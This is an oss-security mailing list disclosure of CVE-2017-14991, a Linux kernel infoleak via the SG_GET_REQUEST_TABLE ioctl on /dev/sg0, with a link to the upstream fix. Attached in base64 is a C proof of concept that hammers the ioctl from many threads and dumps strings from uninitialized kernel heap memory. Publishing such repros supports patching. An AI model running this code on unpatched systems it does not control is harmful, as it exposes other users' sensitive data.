+Message-ID: <CAG_fn=WuQgi2dWQesBdAzYEvRGWbLU97qdGMAjiyWkbCEX=bRQ@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: multipart/mixed; boundary="001a1144077ad9c25b055b199567"
+Subject: [oss-security] CVE-2017-14991 in the Linux Kernel: local infoleak via an
+ SG_GET_REQUEST_TABLE ioctl call for /dev/sg0
+
+--001a1144077ad9c25b055b199567
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+
+Hello,
+
+Kernel commit 109bade9c625c89bb5ea753aaa1a0a97e6fbb548 has introduced
+an infoleak which manifests when the SG_GET_REQUEST_TABLE ioctl is
+called for /dev/sg0 (see the attached repro).
+The bug allows local users to obtain sensitive information from
+uninitialized kernel heap-memory locations. Linux kernels before
+4.13.4 are affected.
+The bug has been found with syzkaller and KMSAN, upstream fix is here:
+https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?=
+id=3D3e0097499839e0fe3af380410eababe5a47c4cf9
+
+--=20
+Alexander Potapenko
+Software Engineer
+
+Google Germany GmbH
+Erika-Mann-Stra=C3=9Fe, 33
+80636 M=C3=BCnchen
+
+Gesch=C3=A4ftsf=C3=BChrer: Paul Manicle, Halimah DeLaine Prado
+Registergericht und -nummer: Hamburg, HRB 86891
+Sitz der Gesellschaft: Hamburg
+
+--001a1144077ad9c25b055b199567
+Content-Type: text/x-csrc; charset="US-ASCII"; name="sg_ioctl.c"
+Content-Disposition: attachment; filename="sg_ioctl.c"
+Content-Transfer-Encoding: base64
+X-Attachment-Id: f_j8jyj8ka0
+
+I2RlZmluZSBfR05VX1NPVVJDRQoKI2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNs
+dWRlIDxzdGRpbnQuaD4KI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxz
+dHJpbmcuaD4KI2luY2x1ZGUgPHB0aHJlYWQuaD4KI2luY2x1ZGUgPHN5cy9z
+eXNjYWxsLmg+CiNpbmNsdWRlIDxzeXMvbW1hbi5oPgojaW5jbHVkZSA8dW5p
+c3RkLmg+CiNpbmNsdWRlIDxzY3NpL3NnLmg+CgpwdGhyZWFkX211dGV4X3Qg
+b3V0X211dGV4ID0gUFRIUkVBRF9NVVRFWF9JTklUSUFMSVpFUjsKCmludCBt
+aW5fc3RybGVuID0gMjQ7Cgp2b2lkIGR1bXBfYnVmKHVuc2lnbmVkIGNoYXIg
+KmJ1ZiwgaW50IGxlbikgewogIGludCBpLCBueiA9IDA7CiAgZm9yIChpID0g
+MDsgaSA8IGxlbjsgaSsrKSB7CiAgICBpZiAoYnVmW2ldKSB7CiAgICAgIG56
+ID0gMTsKICAgICAgYnJlYWs7CiAgICB9CiAgfQogIGlmICghbnopIHsKICAg
+IC8vIFRoZSBidWZmZXIgaXMgZW1wdHkuCiAgICByZXR1cm47CiAgfQogIHB0
+aHJlYWRfbXV0ZXhfbG9jaygmb3V0X211dGV4KTsKICBmb3IgKGkgPSAwOyBp
+IDwgbGVuOyBpKyspIHsKICAgIGlmIChidWZbaV0pIHsKICAgICAgaW50IHN0
+cl9sZW4gPSBzdHJsZW4oJmJ1ZltpXSk7CiAgICAgIC8vIFNob3J0IHN0cmlu
+ZyBwaWVjZXMgYXJlIHRvbyBib3JpbmcuCiAgICAgIGlmIChzdHJfbGVuID49
+IG1pbl9zdHJsZW4pIHsKICAgICAgICB1bnNpZ25lZCBjaGFyICpjOwogICAg
+ICAgIGZvciAoYyA9ICZidWZbaV07IGMgPCAmYnVmW2kgKyBzdHJfbGVuXTsg
+YysrKSB7CiAgICAgICAgICBpZiAoKCpjID4gMTI3KSB8fCAoKCpjIDwgMzIp
+ICYmICgqYyAhPSAxMCkgJiYgKCpjICE9IDEzKSkpICB7CiAgICAgICAgICAg
+ICpjID0gJyAnOwogICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgIH0K
+ICAgICAgICB9CiAgICAgICAgLy8gRHVtcCB0aGUgYnVmZmVyLgogICAgICAg
+IGZwcmludGYoc3RkZXJyLCAiJyVzJ1xuIiwgJmJ1ZltpXSk7CiAgICAgIH0K
+ICAgICAgaSArPSBzdHJfbGVuOwogICAgfQogIH0KICBwdGhyZWFkX211dGV4
+X3VubG9jaygmb3V0X211dGV4KTsKfQoKaW50IGRldjsKdm9pZCAqZG9fd29y
+ayh2b2lkICpfKSB7CiAgdm9pZCAqbWVtID0gbW1hcCgwLCAweDEwMDAsIFBS
+T1RfUkVBRCB8IFBST1RfV1JJVEUsIE1BUF9QUklWQVRFIHwgTUFQX0FOT05Z
+TU9VUywgLTEsIDApOwogIGlvY3RsKGRldiwgU0dfR0VUX1JFUVVFU1RfVEFC
+TEUsIG1lbSk7CiAgZHVtcF9idWYobWVtLCBzaXplb2Yoc2dfcmVxX2luZm9f
+dCkgKiBTR19NQVhfUVVFVUUpOwogIG11bm1hcChtZW0sIDB4MTAwMCk7Cn0K
+CiNkZWZpbmUgTlVNX1RIUkVBRFMgMTYKCmludCBtYWluKCkKewogIGludCBp
+LCBqOwogIHB0aHJlYWRfdCB0aHJbTlVNX1RIUkVBRFNdOwoKICBkZXYgPSBv
+cGVuKCIvZGV2L3NnMCIsIE9fUkRPTkxZKTsKICBpZiAoZGV2ID09IC0xKQog
+ICAgcmV0dXJuIDE7CiAgZm9yIChpID0gMDsgaSA8IDEwMDAwMDsgaSsrKSB7
+CiAgICBmb3IgKGogPSAwOyBqIDwgTlVNX1RIUkVBRFM7IGorKykgewogICAg
+ICBwdGhyZWFkX2NyZWF0ZSgmdGhyW2pdLCBOVUxMLCBkb193b3JrLCBOVUxM
+KTsKICAgIH0KICAgIGZvciAoaiA9IDA7IGogPCBOVU1fVEhSRUFEUzsgaisr
+KSB7CiAgICAgIHB0aHJlYWRfam9pbih0aHJbal0sIE5VTEwpOwogICAgfQog
+IH0KICByZXR1cm4gMDsKfQoK
+
+--001a1144077ad9c25b055b199567--
